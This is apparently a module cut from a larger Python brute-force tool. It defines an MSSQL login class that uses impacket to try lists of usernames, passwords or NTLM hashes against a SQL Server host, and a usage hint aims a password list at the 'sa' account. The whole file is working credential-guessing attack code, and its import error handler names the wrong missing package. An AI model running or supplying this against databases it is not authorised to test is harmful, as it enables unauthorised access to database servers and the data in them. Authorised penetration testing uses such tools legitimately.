#coding=utf-8

try:
  from impacket import tds
  from impacket.tds import TDS_ERROR_TOKEN, TDS_LOGINACK_TOKEN
except ImportError:
  notfound.append('pyopenssl')

class MSSQL_login:
  '''Brute-force MSSQL'''

  usage_hints = (
    """%prog host=10.0.0.1 user=sa password=FILE0 0=passwords.txt -x ignore:fgrep='Login failed for user'""",
    )

  available_options = (
    ('host', 'target host'),
    ('port', 'target port [1433]'),
    ('user', 'usernames to test'),
    ('password', 'passwords to test'),
    ('windows_auth', 'use Windows auth [0|1]'),
    ('domain', 'domain to test []'),
    ('password_hash', "LM/NT hashes to test ('lm:nt' or ':nt')"),
    #('timeout', 'seconds to wait for a response [10]'),
    )
  available_actions = ()

  Response = Response_Base

  def execute(self, host, port='1433', user='', password='', windows_auth='0', domain='', password_hash=None): #, timeout='10'):

    fp = tds.MSSQL(host, int(port))
    fp.connect()

    with Timing() as timing:
      if windows_auth == '0':
        r = fp.login(None, user, password, None, None, False)
      else:
        r = fp.login(None, user, password, domain, password_hash, True)

    if not r:
      key = fp.replies[TDS_ERROR_TOKEN][0]

      code = key['Number']
      mesg = key['MsgText'].decode('utf-16le')

    else:
      key = fp.replies[TDS_LOGINACK_TOKEN][0]

      code = '0'
      mesg = '%s (%d%d %d%d)' % (key['ProgName'].decode('utf-16le'), key['MajorVer'], key['MinorVer'], key['BuildNumHi'], key['BuildNumLow'])

    fp.disconnect()

    return self.Response(code, mesg, timing)